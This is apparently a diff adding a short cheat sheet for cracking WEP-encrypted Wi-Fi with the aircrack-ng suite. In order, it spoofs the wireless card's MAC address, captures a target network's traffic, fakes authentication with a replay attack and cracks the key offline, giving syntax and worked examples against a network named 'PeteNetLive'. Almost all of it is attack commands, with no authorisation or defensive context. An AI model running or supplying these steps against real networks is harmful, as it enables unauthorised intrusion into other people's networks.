@@ -1,0 +1,28 @@
+airmon-ng
+airmon-ng stop wlan0
+ifconfig wlan0 down
+macchanger --mac 00:11:22:33:44:55 wlan0
+airmon-ng start wlan
+
+# To scan and see what networks the card can see issue the following command
+airodump-ng wlan0
+
+# Scan the target network
+SYNTAX
+airodump-ng -c (channel) -w (file name) --bssid (bssid) (interface)
+EXAMPLE
+airodump-ng -c 1 -w PeteNetLive --bssid 00:16:B6:B4:66:46 wlan0
+
+# Replay against WEP for authentication
+SYNTAX
+aireplay-ng -1 0 -a (bssid) -h 00:11:22:33:44:55 -e (essid) (interface)
+EXAMPLE
+aireplay-ng -1 0 -a 00:16:B6:B4:66:46 -h 00:11:22:33:44:55 -e PeteNetLive wlan0
+
+# WEP can be cracked offline.  Store capture name wih -w parameter and crack after 10k IVs are captured
+airodump-ng -c (channel) -w (file name) --bssid (bssid) (interface) #capture
+airodump-ng -c 1 -w PeteNetLive --bssid 00:16:B6:B4:66:46 wlan0 #capture
+SYNTAX
+aircrack-ng -b (bssid) (file name-01.cap)
+EXAMPLE
+aircrack-ng -b 00:16:B6:B4:66:46 PeteNetLive-01.cap
